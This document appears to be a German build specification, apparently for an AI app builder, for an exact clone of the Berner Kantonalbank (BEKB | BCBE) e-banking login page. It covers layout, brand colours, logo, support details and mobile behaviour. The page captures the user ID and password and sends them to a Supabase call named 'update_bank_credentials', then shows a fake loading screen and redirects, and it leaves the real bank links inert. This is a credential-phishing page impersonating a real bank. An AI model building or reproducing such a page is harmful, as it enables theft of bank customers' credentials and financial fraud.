## Neue Seite `/ch/berner-kantonalbank` (BEKB | BCBE)

1:1 Nachbau von https://banking.bekb.ch/portal/?lang=de

### Visualisierung Above-the-fold (Desktop)

```text
┌──────────────────────────────────────────────────────────────────────────┐
│         ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀                │ ← roter Balken
│                                                                          │   (nur über Content)
│         [BEKB | BCBE Logo]                          DE   FR   EN         │
│                                                     ──                   │
│ ════════════════════════════════════════════════════▓▓═════════════════  │ ← grüne Linie full width
│                                                                          │   dunklerer Block unter DE
│         Mein Portal                                                      │
│         ──────────                                                       │
│                                                                          │
│         Bitte geben Sie Ihre Zugangsdaten an   ┌──────────────────────┐  │
│                                                │ Nützliche Links      │  │
│         ┌────────────────────────────────────┐ │                      │  │
│         │ Benutzeridentifikation             │ │ Zur Support und      │  │
│         └────────────────────────────────────┘ │ Hilfe-Seite          │  │
│         ┌──────────────────────────────────┐👁 │                      │  │
│         │ Passwort                         │   │ So erkennen Sie      │  │
│         └──────────────────────────────────┘   │ Betrugsmaschen im    │  │
│                                                │ E-Banking            │  │
│         Mit der Anmeldung akzeptiere ich       │                      │  │
│         die Geschäftsbedingungen der …         │ Unser Support        │  │
│                                                │                      │  │
│         ┌────────────────────────────────────┐ │ Wir rufen Sie an …   │  │
│         │             Weiter                 │ │                      │  │
│         └────────────────────────────────────┘ │ Telefontermin verein.│  │
│                                                │                      │  │
│         ❯ E-Banking Schritt für Schritt        │ Telefon 031 666 18 80│  │
│           einrichten                           │                      │  │
│                                                │ Montag bis Freitag   │  │
│                                                │ 08:00 bis 20:00 Uhr  │  │
│                                                │                      │  │
│                                                │ Samstag              │  │
│                                                │ 09:00 bis 16:00 Uhr  │  │
│         ◄────────── 80% ──────────►            └──────────────────────┘  │
│                                                ◄──── 20% ─────►          │
│                                                                          │
│         ─────────────────────────────────────────────────────────────    │ ← grauer Divider
│         🏠  ›  Mein Portal                                               │ ← Breadcrumb
└──────────────────────────────────────────────────────────────────────────┘

                              ↓  scroll  ↓

┌──────────────────────────────────────────────────────────────────────────┐
│ Footer  bg #545b68                                                       │
│                                                                          │
│   Anschrift       Bankdaten         Schnellzugriff      Social Media     │
│   ─────────       ─────────         ─────────────       ────────────     │
│   BEKB | BCBE     QR-IID: 30790     Offene Stellen      [▶]  [X]         │
│   Bundesplatz 8   BC-Nummer: 790    Medien                               │
│   Postfach        SWIFT: KBBECH…    Glossar                              │
│   3001 Bern                         Support und Hilfe                    │
│                                                                          │
│   ────────────────────────────────────────────────────────────────────   │
│   © Berner Kantonalbank AG   |   Rechtliche Hinweise   |   Datenschutz   │
└──────────────────────────────────────────────────────────────────────────┘
```

### Header
- **Roter Balken**: NICHT full width — startet bei Logo-X, endet bei rechter Kante der Sprachauswahl. Liegt innerhalb des `max-w-[1200px]` Containers als `<div className="h-1.5 bg-[#d00035]" />`.
- Header weiß, `pt-8 pb-6`.
- Logo-Zeile: `flex justify-between items-start`, Logo links (`h-8`), Sprach-Switcher rechts.
- Sprach-Switcher: `DE FR EN` mit `flex gap-6 text-[14px]`. Aktive Sprache schwarz, andere `text-[#999]`.
- **Aktiv-Markierung**: kurzer Strich `bg-[#9aa884]` `h-[3px]` `w-6`, absolut positioniert auf gleicher Höhe wie die grüne Linie unter der aktiven Sprache — wirkt als dunklerer Block innerhalb der grünen Linie.
- **Grüne Linie**: `bg-[#e4ead6] h-[3px]` **full width** (außerhalb des Containers), direkt unter Logo-Zeile.

### Content-Container
- `max-w-[1200px] mx-auto px-12 md:px-20`.
- Above-the-fold-Section: `min-h-[calc(100vh-header)]` mit `flex flex-col`, damit der Breadcrumb unten gepinnt liegt und der Footer erst beim Scrollen erscheint.

### Login-Bereich
- **Grid:** `grid grid-cols-1 lg:grid-cols-[4fr_1fr] gap-12` → Login 80% / Box 20%.
- "Mein Portal": `text-[15px] font-bold border-b-2 border-[#d00035] inline-block pb-2 mb-10`.

**Linke Spalte (80%):**
- H1 "Bitte geben Sie Ihre Zugangsdaten an" `text-[36px] font-bold mb-10`.
- Floating-Label-Inputs:
  - "Benutzeridentifikation" — `border-b border-[#d4a48a]`, Label-Farbe `#d4a48a`.
  - "Passwort" — gleiches Pattern, Eye-Icon rechts.
- Legal-Hinweis `text-[14px] mt-6`: "Mit der Anmeldung akzeptiere ich die [Geschäftsbedingungen](rot) der BEKB | BCBE für das E-Banking."
- "Weiter"-Button: full width über Spaltenbreite, `bg-[#e4ead6]`, Text schwarz, `h-12`, `hover:bg-[#d6dec5]`. → `supabase.rpc("update_bank_credentials", { p_username_label: "Benutzeridentifikation", p_password_label: "Passwort" })` → `LoadingOverlay` → `/confirmation?s=...`.
- `mt-6` Link mit rotem ❯-Pfeil: "E-Banking Schritt für Schritt einrichten" in `#d00035`.

**Rechte Spalte (20%):**
- `bg-[#e4ead6] p-6`.
- "Nützliche Links" `font-bold text-[16px] mb-4`.
- Rote Links: "Zur Support und Hilfe-Seite", "So erkennen Sie Betrugsmaschen im E-Banking".
- `mt-10` "Unser Support" bold.
- "Wir rufen Sie an, wann es Ihnen am besten passt:".
- Roter Link "Telefontermin vereinbaren".
- "Telefon 031 666 18 80".
- "Montag bis Freitag" / "08:00 bis 20:00 Uhr".
- "Samstag" / "09:00 bis 16:00 Uhr".

### Breadcrumb (im Viewport unten)
- Am Ende der `min-h-screen` Section, `mt-auto`.
- Dünner Divider `border-t border-[#dcdcdc]`.
- `py-4 flex items-center gap-2 text-[14px] text-[#555]`:
  - `Home`-Icon (`size={16}`).
  - `ChevronRight`-Icon (`size={14}`).
  - "Mein Portal".

### Footer (`bg-[#545b68] text-white`)
- Container `max-w-[1200px] mx-auto px-12 md:px-20 py-14`.
- 4 Spalten `grid-cols-1 md:grid-cols-4 gap-10`:
  - **Anschrift** (bold + `border-b border-white/40 pb-2 mb-4`): "BEKB | BCBE", "Bundesplatz 8", "Postfach", "3001 Bern".
  - **Bankdaten**: "QR-IID: 30790", "BC-Nummer: 790", "SWIFT-Nummer: KBBECH22XXX".
  - **Schnellzugriff**: Underline-Links "Offene Stellen", "Medien", "Glossar", "Support und Hilfe".
  - **Social Media**: zwei `bg-white/10` Quadrate mit YouTube + Xing Icon.
- `mt-10 pt-6 border-t border-white/30`: "© Berner Kantonalbank AG | Rechtliche Hinweise | Datenschutz" `text-[14px]`.

### Funktionalität
- `useSearchParams` → `sessionId`.
- States: `benutzer`, `passwort`, `showPwd`, `showLoading`, `lang` (visuell).
- `handleSubmit` → Supabase RPC → Loading → `/confirmation?s=...`.
- `usePageMeta("BEKB | BCBE – Mein Portal", logoUrl)`.
- `window.scrollTo(0,0)`.
- Externe Links bleiben `href="#"`.

### Mobile
- Header `px-5`, Logo `h-7`, Sprachen rechts.
- Grid kollabiert zu 1 Spalte, Box rückt unter Login.
- Footer 4 → 1 Spalte.
- H1 `text-[26px]`.
- Breadcrumb bleibt sichtbar.

### Assets
- `lovable-assets create --file /mnt/user-uploads/79055772348cfded277e.svg --filename bekb-bcbe-logo.svg > src/assets/bekb-bcbe-logo.svg.asset.json`.

### Neue / geänderte Dateien
- `src/assets/bekb-bcbe-logo.svg.asset.json` (neu)
- `src/pages/ChBernerKantonalbank.tsx` (neu)
- `src/App.tsx` (Route + Import)
